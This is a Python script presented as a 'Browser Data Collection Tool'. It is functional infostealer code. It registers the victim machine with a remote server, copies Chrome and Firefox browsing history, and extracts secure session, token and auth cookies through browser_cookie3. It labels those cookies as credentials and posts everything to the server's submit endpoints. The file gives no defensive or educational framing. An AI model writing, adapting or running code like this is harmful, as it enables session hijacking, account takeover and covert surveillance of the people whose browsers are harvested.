import os
import sys
import json
import uuid
import platform
import sqlite3
import requests
import socket
from datetime import datetime, timedelta
import browser_cookie3

# Configuration
SERVER_URL = "http://your-server-ip:5000"  # Change to your server address
MACHINE_ID = str(uuid.getnode())  # Uses MAC address as unique identifier

def get_system_info():
    return {
        "machine_id": MACHINE_ID,
        "hostname": socket.gethostname(),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "os_info": f"{platform.system()} {platform.release()}"
    }

def register_machine():
    system_info = get_system_info()
    try:
        response = requests.post(f"{SERVER_URL}/register", json=system_info)
        return response.status_code == 200
    except Exception as e:
        print(f"Error registering machine: {e}")
        return False

def get_chrome_history():
    history_entries = []
    try:
        # Chrome history file path depends on OS
        if platform.system() == "Windows":
            history_path = os.path.join(os.getenv('LOCALAPPDATA'),
                                        'Google\\Chrome\\User Data\\Default\\History')
        elif platform.system() == "Darwin":
            history_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/History')
        elif platform.system() == "Linux":
            history_path = os.path.expanduser('~/.config/google-chrome/Default/History')
        else:
            return []

        temp_path = f"/tmp/chrome_history_{uuid.uuid4()}"
        os.system(f"cp '{history_path}' '{temp_path}'")

        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")

        for row in cursor.fetchall():
            url, title, timestamp = row
            chrome_time = datetime(1601, 1, 1) + timedelta(microseconds=timestamp)
            history_entries.append({
                "url": url,
                "title": title,
                "visit_time": chrome_time.isoformat(),
                "browser_type": "chrome"
            })

        conn.close()
        os.remove(temp_path)
    except Exception as e:
        print(f"Error getting Chrome history: {e}")

    return history_entries

def get_firefox_history():
    history_entries = []
    try:
        if platform.system() == "Windows":
            profile_path = os.path.join(os.getenv('APPDATA'), 'Mozilla\\Firefox\\Profiles')
        elif platform.system() == "Darwin":
            profile_path = os.path.expanduser('~/Library/Application Support/Firefox/Profiles')
        elif platform.system() == "Linux":
            profile_path = os.path.expanduser('~/.mozilla/firefox')
        else:
            return []

        profiles = os.listdir(profile_path)
        default_profile = next((p for p in profiles if 'default' in p), None)

        if not default_profile:
            return []

        history_path = os.path.join(profile_path, default_profile, 'places.sqlite')
        temp_path = f"/tmp/firefox_history_{uuid.uuid4()}"
        os.system(f"cp '{history_path}' '{temp_path}'")

        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT url, title, visit_date FROM moz_places
            JOIN moz_historyvisits ON moz_historyvisits.place_id = moz_places.id
            ORDER BY visit_date DESC LIMIT 100
        """)

        for row in cursor.fetchall():
            url, title, timestamp = row
            firefox_time = datetime.fromtimestamp(timestamp / 1_000_000)
            history_entries.append({
                "url": url,
                "title": title,
                "visit_time": firefox_time.isoformat(),
                "browser_type": "firefox"
            })

        conn.close()
        os.remove(temp_path)
    except Exception as e:
        print(f"Error getting Firefox history: {e}")

    return history_entries

def get_saved_credentials():
    credentials = []
    try:
        chrome_cookies = browser_cookie3.chrome()
        for cookie in chrome_cookies:
            if cookie.secure and cookie.name in ('sessionid', 'session', 'token', 'auth'):
                credentials.append({
                    "website": cookie.domain,
                    "username": cookie.name,
                    "password": cookie.value,
                    "browser_type": "chrome"
                })
    except Exception as e:
        print(f"Error getting Chrome cookies: {e}")

    try:
        firefox_cookies = browser_cookie3.firefox()
        for cookie in firefox_cookies:
            if cookie.secure and cookie.name in ('sessionid', 'session', 'token', 'auth'):
                credentials.append({
                    "website": cookie.domain,
                    "username": cookie.name,
                    "password": cookie.value,
                    "browser_type": "firefox"
                })
    except Exception as e:
        print(f"Error getting Firefox cookies: {e}")

    return credentials

def send_history_data():
    chrome_history = get_chrome_history()
    firefox_history = get_firefox_history()
    all_history = chrome_history + firefox_history

    payload = {
        "machine_id": MACHINE_ID,
        "history": all_history
    }

    try:
        response = requests.post(f"{SERVER_URL}/submit/history", json=payload)
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending history data: {e}")
        return False

def send_credentials_data():
    credentials = get_saved_credentials()
    payload = {
        "machine_id": MACHINE_ID,
        "credentials": credentials
    }

    try:
        response = requests.post(f"{SERVER_URL}/submit/credentials", json=payload)
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending credentials data: {e}")
        return False

def main():
    print("Browser Data Collection Tool")
    print("--------------------------")

    print("Registering machine...")
    if register_machine():
        print("Registration successful")
    else:
        print("Registration failed")
        return

    print("Collecting browser history...")
    if send_history_data():
        print("History data sent successfully")
    else:
        print("Failed to send history data")

    print("Collecting saved credentials...")
    if send_credentials_data():
        print("Credentials data sent successfully")
    else:
        print("Failed to send credentials data")

    print("Done!")

if __name__ == "__main__":
    main()

